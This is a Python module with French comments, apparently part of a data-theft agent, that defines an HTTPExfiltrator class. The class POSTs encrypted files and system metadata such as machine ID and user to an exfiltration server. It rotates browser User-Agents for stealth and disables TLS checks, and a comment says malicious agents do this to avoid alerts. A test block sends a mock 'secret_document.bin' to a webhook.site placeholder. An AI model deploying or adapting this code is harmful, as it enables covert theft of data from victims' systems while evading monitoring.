import requests
import random
import time
import json # Pour le corps de la requête ou pour les messages d'erreur

class HTTPExfiltrator:
    """
    Gère l'exfiltration de données via HTTP/HTTPS.
    Utilise la bibliothèque requests pour envoyer des requêtes POST.
    """

    def __init__(self, target_url: str, logger=None, timeout: int = 15):
        """
        Initialise l'exfiltrateur HTTP.

        :param target_url: L'URL complète de la cible d'exfiltration (ex: https://exfil.domain.com/upload).
        :param logger: Instance du logger pour la journalisation.
        :param timeout: Temps d'attente maximum pour la réponse du serveur en secondes.
        """
        self.target_url = target_url
        self.logger = logger
        self.timeout = timeout
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
        ]
        if self.logger:
            self.logger.log_debug(f"[HTTPExfiltrator] Initialisé avec URL: {self.target_url}")

    def _log(self, level, message):
        """Helper pour logguer si un logger est disponible."""
        if self.logger:
            getattr(self.logger, f"log_{level}")(f"[HTTPExfiltrator] {message}")
        else:
            print(f"[{level.upper()}] [HTTPExfiltrator] {message}")

    def exfiltrate(self, data: bytes, filename: str, metadata: dict = None) -> bool:
        """
        Envoie les données via une requête POST HTTP/HTTPS.

        :param data: Les données binaires à exfiltrer (doivent déjà être chiffrées et compressées).
        :param filename: Le nom original du fichier (pour l'identifier côté serveur).
        :param metadata: Dictionnaire d'informations supplémentaires à inclure (ex: info système, timestamp).
        :return: True si l'exfiltration a réussi, False sinon.
        """
        headers = {
            "User-Agent": random.choice(self.user_agents), # User-Agent aléatoire pour la furtivité
            "Content-Type": "application/octet-stream", # Type générique pour les données binaires
            "X-Filename": filename, # Un header personnalisé pour le nom du fichier
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

        # Ajouter les métadonnées si présentes
        if metadata:
            try:
                # Encoder les métadonnées en JSON et Base64 pour les passer dans un header si elles sont petites
                # Ou les inclure dans le corps si le Content-Type le permet (multipart/form-data par exemple)
                # Pour l'instant, on les met dans un header simple, en pensant qu'elles sont petites.
                # Une approche plus robuste serait de les inclure dans un formulaire multipart.
                headers["X-Metadata"] = json.dumps(metadata)
            except TypeError as e:
                self._log("warning", f"Impossible de sérialiser les métadonnées en JSON: {e}")

        self._log("info", f"Tentative d'exfiltration de '{filename}' vers {self.target_url}...")
        
        try:
            # Pour la démo, on peut considérer le corps comme les 'data' brutes
            # Dans un scénario réel, on pourrait utiliser un formulaire multipart/form-data
            # pour envoyer à la fois le fichier et des métadonnées structurées.
            response = requests.post(
                self.target_url,
                data=data, # Les données chiffrées et compressées
                headers=headers,
                timeout=self.timeout,
                verify=False # ATTENTION: Désactive la vérification SSL/TLS.
                             # À utiliser UNIQUEMENT pour les tests ou si vous gérez la validation des certificats manuellement.
                             # Pour la production, toujours vérifier les certificats si possible.
                             # Pour un agent malveillant, c'est souvent désactivé pour éviter les alertes.
            )

            if response.status_code == 200:
                self._log("info", f"Exfiltration de '{filename}' réussie. Réponse du serveur: {response.text[:100]}...")
                return True
            else:
                self._log("error", f"Exfiltration de '{filename}' échouée. Statut: {response.status_code}, Réponse: {response.text[:200]}...")
                return False

        except requests.exceptions.Timeout:
            self._log("error", f"Timeout lors de l'exfiltration de '{filename}' vers {self.target_url}.")
            return False
        except requests.exceptions.ConnectionError as e:
            self._log("error", f"Erreur de connexion lors de l'exfiltration de '{filename}': {e}")
            return False
        except requests.exceptions.RequestException as e:
            self._log("error", f"Erreur de requête inattendue lors de l'exfiltration de '{filename}': {e}")
            return False
        except Exception as e:
            self._log("error", f"Erreur générique lors de l'exfiltration de '{filename}': {e}")
            return False

# --- Partie de test (à exécuter si le fichier est lancé directement) ---
if __name__ == "__main__":
    print("[+] Test du module HTTPExfiltrator...")

    # Simuler un serveur HTTP très simple pour les tests
    # Pour exécuter ce test, vous aurez besoin d'un serveur temporaire.
    # Vous pouvez lancer un serveur Python simple dans un autre terminal:
    # python3 -m http.server 8000
    # Ou un Flask/Django/Node.js plus complet qui accepte les POST requests.

    # URL d'un serveur de test public (ex: Postman Echo ou RequestBin)
    # ou de votre propre serveur de test.
    # Pour un test simple qui affiche ce que le serveur reçoit:
    # 1. Allez sur https://webhook.site/ et copiez l'URL unique.
    # 2. Remplacez l'URL ci-dessous par la vôtre.
    TEST_SERVER_URL = "https://webhook.site/YOUR_UNIQUE_URL_HERE"
    # Par exemple, si vous lancez un serveur local:
    # TEST_SERVER_URL = "http://127.0.0.1:8000/upload" # Assurez-vous que votre serveur écoute sur ce chemin

    # Remplacez ceci par une URL réelle pour un test fonctionnel
    print(f"\n[!] Pour un test réel, configurez un serveur HTTP/HTTPS à l'adresse: {TEST_SERVER_URL}")
    print("[!] Vous pouvez utiliser https://webhook.site/ pour un test rapide.")
    print("[!] N'oubliez pas de remplacer 'YOUR_UNIQUE_URL_HERE' par votre URL réelle.")
    print("[!] Si vous utilisez un serveur local, lancez-le dans un autre terminal (ex: python3 -m http.server 8000).")
    
    # Données de test (simulons des données chiffrées/compressées)
    test_data = b"This is some dummy data to exfiltrate. It would normally be encrypted and compressed."
    test_filename = "secret_document.bin"
    test_metadata = {"system_id": "test_machine_001", "user": "test_user"}

    # Initialisation de l'exfiltrateur
    exfiltrator = HTTPExfiltrator(TEST_SERVER_URL)

    # Tentative d'exfiltration
    print(f"\n[*] Tentative d'exfiltration de '{test_filename}' (longueur: {len(test_data)} bytes)...")
    success = exfiltrator.exfiltrate(test_data, test_filename, test_metadata)

    if success:
        print(f"[+] Exfiltration de '{test_filename}' rapportée comme réussie.")
        print("[+] Vérifiez le serveur cible (ou webhook.site) pour voir les données reçues.")
    else:
        print(f"[-] Exfiltration de '{test_filename}' rapportée comme échouée.")
        print("[-] Vérifiez la console pour les messages d'erreur détaillés.")

    print("\n[+] Tests du module HTTPExfiltrator terminés.")
    print("[!] N'oubliez pas que 'verify=False' est utilisé pour les tests et n'est PAS recommandé en production.")

